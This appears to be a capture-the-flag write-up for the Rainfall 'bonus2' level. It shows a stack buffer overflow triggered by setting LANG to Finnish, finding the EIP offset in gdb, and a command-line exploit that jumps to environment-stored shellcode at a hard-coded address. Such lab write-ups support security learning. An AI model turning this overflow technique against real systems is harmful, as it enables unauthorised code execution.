# Rainfall - Bonus 2

## Executable Analyse

The program searches for a language parameter using `getenv("LANG")`.  

There are three different languages to say *hello* in 3 different ways.  

The program concatenates the hello translation with the two character strings gives as arguments.

Using the longest hello we can overflow.

## Language overflow

The longest hello is in Finnish, you can change the language in the environment :  
```bash
export LANG="fi"
```

We can use gdb to find the EIP overflow address :  
```
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A Aa0Aa1Aa2Aa3Aa4Aa5ABCD 
Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A Aa0Aa1Aa2Aa3Aa4Aa5ABCD

Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5ABCD

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
```

The same way we did bonus0 exercice we can use the shellcode in environnement at `0xbffff8f1` to get the flag :  

```bash
./bonus2 $(python -c 'print "a" * 40') $(python -c 'print "a" * 18 + "\xbf\xff\xf8\xf1"[::-1]')
```